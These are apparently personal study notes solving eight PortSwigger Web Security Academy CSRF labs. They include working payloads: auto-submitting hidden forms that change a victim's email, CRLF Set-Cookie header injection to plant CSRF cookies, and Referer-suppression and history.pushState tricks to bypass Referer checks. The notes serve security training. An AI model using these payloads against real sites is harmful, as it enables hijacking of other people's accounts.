Cross-site request forgery (CSRF)
https://portswigger.net/web-security/csrf

<!-- 1. Lab: CSRF vulnerability with no defenses -->
https://portswigger.net/web-security/csrf/lab-no-defenses

goal:
To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

1. do the process of login and changing email to establish request format and syntax - send request to repeater:
POST /my-account/change-email HTTP/1.1\
Host: 0aa700d004d14148c0977450001c00a8.web-security-academy.net
Cookie: session=yCKgkq71rWvYSZOkOdEht0vvA2kdgiS3
..

email=attacker%40gmail.com


2. create a form on the server with the url from stage 1 - to be sent in clients behalf when he enters the maliocious site:
<html>
    <body>
        <form action="URL" method="POST">
            <input type="hidden" name="email" value="email@new.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

3. final payload: 
#
  <html>
    <body>
        <form action="https://0aa700d004d14148c0977450001c00a8.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@gmail.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>


if site supports GET it can be done in a single line (without need for a site):
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">





<!-- 2. Lab: CSRF where token validation depends on request method -->
https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address. 
smae as last lab - just change requets to GET:

1. do the process of login and changing email to establish request format and syntax - send request to repeater:
POST /my-account/change-email HTTP/1.1\
Host:0a3a009803bd4ed7c0a6186c000500e5.web-security-academy.net
..
email=attacker@gmail.com

2. change to GET method and copy url:
https://0a3a009803bd4ed7c0a6186c000500e5.web-security-academy.net/my-account/change-email?email=attacker@gmail.com


3. use this template:
<html>
    <body>
        <form method="GET" action="URL">
            <input type="hidden" name="email" value="email@new.com">
        </form>
        <script>
                document.forms[0].submit();
        </script>
    </body>
</html>

# final payload:

<html>
    <body>
        <form method="GET" action="https://0a3a009803bd4ed7c0a6186c000500e5.web-security-academy.net/my-account/change-email?email=attacker@gmail.com">
            <input type="hidden" name="email" value="blablabla" />
        </form>
        <script>
                document.forms[0].submit();
        </script>
    </body>
</html>


<!-- 3. Lab: CSRF where token validation depends on token being present -->
https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.


ommit the CSRF header in exploit site it as if it has no csrf (pretty dumb application of the CSRF):
<html>
    <body>
        <form action="https://0a27009a045fca44c096adf700fd0027.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@gmail.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>!

<!-- 4. Lab: CSRF where token is not tied to user session -->
https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session


To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address. 

1. login and send request to change email - get 302 and send to repeater. try to resend the req from the reapeter and get 400 "Invalid CSRF token"
now we know its a 1-time token

2. intercept and catch 3 requests to reapeter for further analasys. open incognito window, sign in and do the same for carlos. make sure you drop each messege after sending to the repeater

3. try to use unused token of peter on peter old request to check coralation between session and toke. do it also for token from carlos on session of peter (or vice versa)
now we know no coralation exist we can use our token with any other user seesion

4. prepare html POST form with email and cdrf values. make sure to use only unsused token. test exploit on yourself. once successed - replce token with unused token and send it to victim.

working exploit:

<html>
    <body>
        <form action="https://0a2500e603186d67c02c0121009f009e.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@gmail.com" />
            <input type="hidden" name="csrf" value="Raj0C3E8iKUphSJxB587fdoYsYIxwTrt" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>


<!-- 5.Lab: CSRF where token is tied to non-session cookie -->
https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie


1. change csrf value - 400 "Invalid CSRF token"
2. change csrfKey value - 400 "Invalid CSRF token"
csrf values are paired
3. change session value - 302 login to new session
probably not related to csrf values
4. login to carlos in incognito mode send email-change request to repeater. 
5. use carlos csrf with peter csrfKey - 400 "Invalid CSRF token"
6. use peter csrf value pair on carlos session - 302 found
check at my account page to make sure it changed.
7. look for "Set-Cookie" HEADER in site responses: find set-cookie reflected on response to: GET /?search=bla HTTP/1.1  -->send to repeater
8. craft HEADER-injecting payload using %0d%0a (\r\n) which will be parsed into:
    ?search=bla \r\n
    set-cookie: csrfKey={csrfKey value}
final cookie-injecting payload:
/?search=bla%0d%0aSet-Cookie:%20csrfKey=gTJ5CEmATdd8sGCwH4Uo3NgqEd4uo7xP
10. test on repeter - 400 "Potentially dangerous search term". request in browser and see csrf cookie added with injected value
11. craft <img> tag to force-visit the cookie-loading link and execute onerror-submition of the form:
<img src="https://0ac200de030c4653c0b2248d00a500a7.web-security-academy.net/?search=bla%0d%0aSet-Cookie:%20csrfKey=gTJ5CEmATdd8sGCwH4Uo3NgqEd4uo7xP" onerror="document.forms[0].submit()">

12. craft html on exploit. make sure to use a paired csrf and csrfKey values:

<html>
    <body>
        <form method="POST" action="https://0ac200de030c4653c0b2248d00a500a7.web-security-academy.net/my-account/change-email">
            <input type="hidden" name="email" value="evil@new.com" />
            <input type="hidden" name="csrf" value="I3cdY6uXw5SWiE2FbnphGtw7GO2V2wH1" />
        </form>
        <img src="https://0ac200de030c4653c0b2248d00a500a7.web-security-academy.net/?search=bla%0d%0aSet-Cookie:%20csrfKey=gTJ5CEmATdd8sGCwH4Uo3NgqEd4uo7xP" onerror="document.forms[0].submit()">
    </body>
</html>


    
<!-- 6. Lab: CSRF where token is duplicated in cookie -->
https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie

1. check relation between csrf and csrfKey, check if any string will work as long as it will be identical between the 2 param

2. find set-cookie injection point and craft url:
https://0a5500bd03baf0c5c079115e00af0056.web-security-academy.net/?search=bla%0d%0aSet-Cookie:%20csrfKey=amotzrules

3. craft malicious site at exploit server:

<html>
    <body>
        <form action="https://0a5500bd03baf0c5c079115e00af0056.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="success@gmail.com" />
            <input type="hidden" name="csrf" value="amotzrules" />
            <input type="submit" value="submit request" />
        </form>
        <img src="https://0a5500bd03baf0c5c079115e00af0056.web-security-academy.net/?search=bla%0d%0aSet-Cookie:%20csrf=amotzrules" onerror="document.forms[0].submit()">
    </body>
</html>

note2self: not like lab 5 - there is no csrfKey - just csrf in both locations...

<!-- 7. Lab: CSRF where Referer validation depends on header being present -->
https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present

goal:
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

research refferer HEADER manipulation yeilds the following command:
<head>
<meta name="referrer" content="never">
</Head>


lets use it inside our exploit center with the form format of the previouse lab:
<html>
    <head>
        <meta name="referrer" content="never">
    </Head>
    <body>
        <form action="https://0a31004204da258bc0af6329003a00be.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="chang2@evil.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>


lab specific materials:
https://www.w3schools.com/tags/tag_meta.asp // what is <meta> tag
https://wiki.whatwg.org/wiki/Meta_referrer //  types of meta referrer commands:
The referrer metadata attribute can have one of four values for its content attribute:
    never
    always
    origin
    default


also:
https://moz.com/blog/meta-referrer-tag#How%20to%20use%20the%20meta%20referrer%20tag
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy


<!-- 8. Lab: CSRF with broken Referer validation -->
https://portswigger.net/web-security/csrf/lab-referer-validation-broken

goal:
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address. 

1. test referer HEADER limitition: what is the shortest version of the url, does it need to be on the start or the end, 

original:
Referer: https://0a5b00e7045ec019c01c1622000300c5.web-security-academy.net/my-account
302 found
0a5b00e7045ec019c01c1622000300c5.web-security-academy.net
302 found
https:google.com#https://0a5b00e7045ec019c01c1622000300c5.web-security-academy.net
302 found

command to use:
History.pushState()
https://developer.mozilla.org/en-US/docs/Web/API/History/pushState
In an HTML document, the history.pushState() method adds an entry to the browser's session history stack. 
craft to add the referrer url to the HEADER:
<script>
        history.pushState("", "", "/?0a5b00e7045ec019c01c1622000300c5.web-security-academy.net")
</script>


lets craft our final html payload on the exploit server:

<html>
    <script>
        history.pushState("", "", "/?0a5b00e7045ec019c01c1622000300c5.web-security-academy.net")
    </script>
    <body>
        <form action="https://0a5b00e7045ec019c01c1622000300c5.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="chang2@evil.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>


important:
since browser ommit the strings after the "?" as default, lets add the refferer policy to force using the full url. we will insert it on the Head section:

Referrer-Policy: unsafe-url


#
unsuccessful tries:
worked on peter account - didnt work on victim: 

File:
/exploit?0a5b00e7045ec019c01c1622000300c5.web-security-academy.net

Head:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

Body:
<html>
    <head>
        <meta name="referrer" content="always">
    </Head>
    <body>
        <form action="https://0a5b00e7045ec019c01c1622000300c5.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="chang2@evil.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>



###############################3333

general materials:
Defending against CSRF with SameSite cookies
https://portswigger.net/web-security/csrf/samesite-cookies

CSRF tokens
https://portswigger.net/web-security/csrf/tokens

XSS vs CSRF
https://portswigger.net/web-security/csrf/xss-vs-csrf